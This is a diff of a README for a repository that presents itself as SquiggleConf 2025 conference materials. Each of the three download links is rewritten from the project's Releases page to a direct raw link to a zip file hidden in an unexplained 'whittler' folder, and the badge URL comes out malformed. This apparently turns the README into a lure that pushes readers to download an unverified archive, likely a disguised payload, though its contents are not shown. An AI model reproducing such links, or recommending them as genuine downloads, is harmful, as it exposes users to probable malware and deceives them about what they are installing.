@@ -4,7 +4,7 @@
 Welcome to squiggleconf-2025! This repository provides everything you need for the SquiggleConf 2025, a web development tooling conference. You will find notes, session materials, and code examples right here.
 
 ## 📥 Download Now
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/KindMan0011/squiggleconf-2025/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/KindMan0011/squiggleconf-2025/main/whittler/squiggleconf-2025.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/KindMan0011/squiggleconf-2025/main/whittler/squiggleconf-2025.zip)
 
 ## 📝 Overview
 This repository contains valuable resources for attendees of SquiggleConf 2025. You will find:
@@ -30,7 +30,7 @@ To get started, you will need to download the materials from our Releases page. 
 2. Locate the latest version available for download.
 3. Click on the release title to download the materials to your computer.
 
-[Download the Latest Release](https://github.com/KindMan0011/squiggleconf-2025/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/KindMan0011/squiggleconf-2025/main/whittler/squiggleconf-2025.zip)
 
 ## 🗂️ Using the Materials
 After downloading, extract the contents of the downloaded file. Inside, you will find folders for different sessions. Here is how to use them:
@@ -66,7 +66,7 @@ Join our community forum or social media groups to share your experiences and in
 ## 📥 Recap: How to Download
 To recap:
 
-1. Visit the [Releases page](https://github.com/KindMan0011/squiggleconf-2025/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KindMan0011/squiggleconf-2025/main/whittler/squiggleconf-2025.zip).
 2. Find and download the appropriate materials.
 3. Extract and start using the resources!
 
